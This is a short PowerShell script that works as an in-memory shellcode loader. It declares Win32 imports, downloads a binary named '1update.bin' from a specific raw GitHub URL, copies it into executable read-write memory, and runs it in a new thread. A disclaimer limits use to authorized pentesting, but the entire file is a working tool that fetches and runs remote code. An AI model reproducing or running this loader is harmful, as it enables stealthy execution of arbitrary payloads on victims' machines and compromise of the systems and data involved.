# DISCLAIMER: Use this only in controlled, authorized environments for educational or pentesting purposes.
# Misuse of this code can lead to legal consequences.

# Define required Win32 API functions using Add-Type
$apiCode = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $apiCode

# URL of your .bin file on GitHub (update this with your actual URL)
$binUrl = "https://raw.githubusercontent.com/XeroxzB/weqeq/main/1update.bin"

# Download the binary data from the GitHub link
try {
    Write-Host "Downloading binary from $binUrl... 🤘"
    $webClient = New-Object System.Net.WebClient
    $binary = $webClient.DownloadData($binUrl)
} catch {
    Write-Host "Failed to download the binary. Check the URL and your network connection. 🚨"
    exit
}

$size = $binary.Length

# Allocate executable memory (0x3000 = MEM_COMMIT | MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE)
$addr = [Win32]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
if ($addr -eq [IntPtr]::Zero) {
    Write-Host "Memory allocation failed. 💥"
    exit
}

# Copy the downloaded binary into allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($binary, 0, $addr, $size)
Write-Host "Binary loaded into memory. Starting execution... 🚀"

# Create a new thread to execute the shellcode
$hThread = [Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($hThread -eq [IntPtr]::Zero) {
    Write-Host "Failed to create thread. ❌"
    exit
}

# Wait indefinitely for the thread to finish
[Win32]::WaitForSingleObject($hThread, 0xFFFFFFFF)